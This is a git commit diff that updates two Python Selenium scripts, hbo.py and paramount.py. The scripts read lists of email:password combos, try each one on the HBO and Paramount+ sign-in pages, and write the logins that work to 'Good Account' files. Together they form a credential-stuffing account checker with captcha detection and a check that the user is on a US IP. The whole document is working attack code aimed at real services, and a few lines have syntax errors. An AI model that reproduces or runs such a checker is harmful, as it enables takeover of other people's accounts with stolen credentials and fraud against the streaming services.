1de71f6be8887b5a8e54f629596efcf5ff4b288d
g3th <theinkandpen@yahoo.co.uk>
2022-08-10 02:43:18 +0100

    modified:   hbo.py 	new file:   headers/paramount_header.py 	modified:   paramount.py

--- hbo.py
+++ hbo.py
@@ -15,7 +15,7 @@ users = []
 passwords = []
 browser_options = Options()
 browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
-browser_options.headless = True
+#browser_options.headless = True
 os.makedirs('accounts',exist_ok=True)
 with open(file_directory, 'r') as hbo:
 	for line in hbo.readlines():
@@ -29,16 +29,14 @@ while index != len(users):
 			browser = webdriver.Chrome(options = browser_options)
 			browser.set_window_size(500,700)
 			browser.get(page)
-			time.sleep(4)
+			time.sleep(7)
 			email_input_box = browser.find_element_by_xpath('//*[@id="EmailTextInput"]')
 			password_input_box = browser.find_element_by_xpath('//*[@id="PasswordTextInput"]')
-			sign_in_button = browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[4]/div[1]/div')
+			sign_in_button = browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[2]/div/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[4]/div[1]/div')					
 			email_input_box.send_keys(users[index])
 			password_input_box.send_keys(passwords[index])
 			sign_in_button.click()
-			time.sleep(2)
-			sign_in_button.click()
-			time.sleep(6)
+			time.sleep(6)			
 			if browser.find_elements_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[2]/div[2]/div/span'):
 				invalid = browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[2]/div[2]/div/span').text
 				if 'The email address or password is incorrect. Please try again.' in str(invalid):
@@ -49,11 +47,7 @@ while index != len(users):
 					print(' | {}:{} ---> Success!'.format(users[index],passwords[index]))
 					account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))
 			index +=1	
-		except ElementClickInterceptedException:			
-			print(' | Click Intercepted, iteration index was not incremented.')			
-		except InvalidSessionIdException:
-			print('Session terminated unexpectedly.\n')
-			break
+
 		except Exception as e:
 			print(e)
 			break
--- paramount.py
+++ paramount.py
@@ -1,64 +1,72 @@
 import time
 import requests
+from headers.paramount_header import header
 from bs4 import BeautifulSoup as soup
-
-from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
+from modules.connection_error import connection_error_try_block as ip_country
+from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, TimeoutException
 from selenium.webdriver.chrome.options import Options
 from selenium import webdriver
 from pathlib import Path
 
+header()
 file_directory = str(Path(__file__).parent)+'/paramount'
 page = 'https://www.paramountplus.com/account/signin/'
-get_current_ip = 'https://www.iplocation.net/'
-info_list =[]
-request = requests.get(get_current_ip)
-parse_request = soup(request.content,'html.parser')
-get_Location = parse_request.find('table',attrs={'class':'iptable'})
-location = get_Location.find_all('td')
-for line in location:
-	info_list.append(line.text.strip())
-if 'US' not in info_list[2]:
-	print('Non-US IP\nThe Program will only work for US IP Adresses.\nEnding.')
+if 'US' not in str(ip_country()[1]):
+	print('Current Location: {}'.format(ip_country()[1]))
+	print('Please use a US IP to check accounts.\nEnding.')
 	exit()
-
 users = []
 passwords = []
 browser_options = Options()
-browser_options.headless = True
-browser = webdriver.Chrome(options = browser_options)
-browser.set_window_size(500,700)
-browser.get(page)
-
-email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
-password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
-sign_in_button = browser.find_element_by_xpath('//*[@id="sign-in-form"]/div/div[3]/button')
-
-
+#browser_options.headless = True
 with open(file_directory, 'r') as paramount:
 	
 	for line in paramount.readlines():
 		users.append(line.split(':')[0].strip())
 		passwords.append(line.split(':')[1].split(' | ')[0].strip())
 
-
-for index in range(len(users)):
-	with open('account_results','a') as account_results:
+index = 0
+while index < len(users):
+	with open('accounts/paramount_working_accounts','a') as account_results:
 		try:
+			print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
+			browser = webdriver.Chrome(options = browser_options)
+			browser.set_page_load_timeout(10)
+			browser.set_window_size(500,700)
+			browser.get(page)
+			time.sleep(2)
+			email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
+			password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
+			sign_in_button = browser.find_element_by_xpath('//*[@id="sign-in-form"]/div/div[3]/button')			
 			email_input_box.send_keys(users[index])
 			password_input_box.send_keys(passwords[index])
 			sign_in_button.click()
 			time.sleep(1)
-			GDPR_Reject_all_button = browser.find_element_by_xpath('/html/body/div/div[3]/div/div/div[2]/div/div/button[2]')
-			time.sleep(1)
-			GDPR_Reject_all_button.click()	
-			time.sleep(2)	
-			invalid_email_text = browser.find_element_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p')
-			error = invalid_email_text.text
-			if 'Invalid email and/or password' in str(error):		
-				account_results.write('{}:{} ---> Bad Account'.format(users[index],passwords[index])
-		except (NoSuchElementException, ElementClickInterceptedException):
-			account_results.write('{}:{} ---> Good Account'.format(users[index],passwords[index])
-			continue
+			if browser.find_elements_by_xpath('//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
+				print('Combo {}:{}. Iteration index not incremented'.format(users[index], passwords[index])
+				raise Error (' -- Captcha Implemented.\n')
+							
+			if browser.find_elements_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p'):
+				invalid_email_text = browser.find_element_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p').text
+				if 'Invalid email and/or password' in str(invalid_email_text):
+					print(' -- {}:{} ---> Invalid Credentials'.format(users[index],passwords[index]))
+			if 'home' in str(browser.current_url):
+				print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))		
+				account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
+			if browser.find_elements_by_xpath('//*[@id="profile-container"]/div/div/div[1]/div[3]'):
+				valid = browser.find_element_by_xpath('//*[@id="profile-container"]/div/div/div[1]/div[3]').text
+				if "Who's Watching" in str(valid):
+					print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))		
+					account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
+			index +=1
+		except Error:
+			break
+		except TimeoutException:
+			print('Timed out. Index not incremented.')
+		except Exception as e:
+			print(e)
+			break
+			
 	
 	
 # //*[@id="main-aa-container"]/section/div/div[1]/p
